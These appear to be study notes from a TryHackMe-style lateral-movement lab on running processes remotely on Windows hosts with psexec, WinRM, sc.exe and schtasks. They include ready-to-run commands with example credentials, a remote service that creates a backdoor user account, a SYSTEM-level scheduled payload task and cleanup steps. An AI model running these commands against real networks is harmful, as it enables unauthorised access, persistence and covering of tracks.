# Spawning Processes Remotely

#Executing a process remotely
## Psexec
	-**Ports**: 445/TCP (SMB)
	-**Required Group Memberships**: Administrators

The way psexec works is as follows:
	1. Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.
	2. Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with C:\Windows\psexesvc.exe.
	3. Create some named pipes to handle stdin/stdout/stderr.

`psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe`

--------------------------------------------------------------------

## Remote Process Creation Using WinRM
	-**Ports**: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
	-**Required Group Memberships**: Remote Management Users

>>Windows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely. Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.

`winrs.exe -u:Administrator -p:Mypass123 -r:target cmd`

We can achieve the same from Powershell, but to pass different credentials, we will need to create a PSCredential object:

```shell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Once we have our PSCredential object, we can create an interactive session using the Enter-PSSession cmdlet:
`Enter-PSSession -Computername TARGET -Credential $credential`

Powershell also includes the Invoke-Command cmdlet, which runs ScriptBlocks remotely via WinRM. Credentials must be passed through a PSCredential object as well:
`Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}`

--------------------------------------------------------------------

## Remotely Creating Services Using sc
	-**Ports**:
		-135/TCP, 49152-65535/TCP (DCE/RPC)
		-445/TCP (RPC over SMB Named Pipes)
		-139/TCP (RPC over SMB Named Pipes)
	-**Required Group Memberships**: Administrators

>>We can create a service on a remote host with sc.exe, a standard tool available in Windows. When using sc, it will try to connect to the Service Control Manager (SVCCTL) remote service program through RPC in several ways:

1. A connection attempt will be made using DCE/RPC. The client will first connect to the Endpoint Mapper (EPM) at port 135, which serves as a catalogue of available RPC endpoints and request information on the SVCCTL service program. The EPM will then respond with the IP and port to connect to SVCCTL, which is usually a dynamic port in the range of 49152-65535.
2. If the latter connection fails, sc will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS).

We can create and start a service named "THMservice" using the following commands:
```shell
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```
To stop and delete the service, we can then execute the following commands:
```shell
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```
-------------------------------------------------------------------------

## Creating Scheduled Tasks Remotely

Another Windows feature we can use is Scheduled Tasks. You can create and run one remotely with schtasks, available in any Windows installation. To create a task named THMtask1, we can use the following commands:
```shell
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1" 
```
Finally, to delete the scheduled task, we can use the following command and clean up after ourselves:

`schtasks /S TARGET /TN "THMtask1" /DELETE /F`

